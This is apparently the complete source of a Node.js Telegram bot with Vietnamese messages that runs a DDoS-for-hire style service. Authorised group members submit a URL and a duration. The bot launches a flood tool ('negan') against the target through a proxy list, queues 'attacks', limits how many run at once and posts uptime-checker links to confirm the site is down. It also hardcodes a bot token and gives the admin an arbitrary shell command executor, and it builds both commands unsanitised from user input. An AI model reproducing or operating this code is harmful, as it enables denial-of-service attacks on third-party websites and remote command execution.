const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxConcurrentAttacks = 3; // Giới hạn số lệnh đồng thời toàn hệ thống
const maxSlot = 1; // Mỗi tài khoản chỉ có thể chạy 1 lệnh đồng thời
const maxTimeAttacks = 120; // Thời gian tối đa cho mỗi lệnh

const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(), attackQueue = [];

bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
console.log('[DEBUG] Bot has started and is ready to receive commands.');

const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

const sendJsonMessage = async (chatId, message, buttons = []) => {
    try {
        await bot.sendMessage(chatId, JSON.stringify(message, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

const executeCommand = async (chatId, command, host, time, username) => {
    const pid = Math.floor(Math.random() * 10000), startTime = getVietnamTime();
    const startMessage = {
        status: "🚀Successfully🚀", pid, website: host, time: `${time} Giây`, caller: username, startTime,
        checkHost: `Check Host (https://check-host.net/check-http?host=${host})`,
        hostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
    };
    const buttons = [
        [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }],
        [{ text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
    ];
    await sendJsonMessage(chatId, startMessage, buttons);

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        const endTime = getVietnamTime();
        const completeMessage = { status: "✅Process completed✅", pid, website: host, time: `${time} Giây`, caller: username, endTime };
        sendJsonMessage(chatId, completeMessage);
        currentAttacks.delete(chatId);
        if (attackQueue.length > 0) executeCommand(...attackQueue.shift());
    });
};

bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền thực hiện lệnh này.', { parse_mode: 'HTML' });

    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });
        if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });

        // Kiểm tra số lệnh đang chạy của người dùng hiện tại
        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
        if (userAttacks >= maxSlot) {
            return bot.sendMessage(chatId, `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất.`, { parse_mode: 'HTML' });
        }

        // Kiểm tra số lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return bot.sendMessage(chatId, '⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...', { parse_mode: 'HTML' });
        }

        currentAttacks.set(chatId, { user: chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, startTime: Date.now() });
        executeCommand(chatId, `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username);
        return;
    }

    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: exe ls', { parse_mode: 'HTML' });
        exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
            const resultMessage = `🚀 Command result:\n<pre>${command}\n${stdout || stderr}</pre>`;
            bot.sendMessage(chatId, resultMessage, { parse_mode: 'HTML' });
        });
        return;
    }

    bot.sendMessage(chatId, '🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.', { parse_mode: 'HTML' });
});
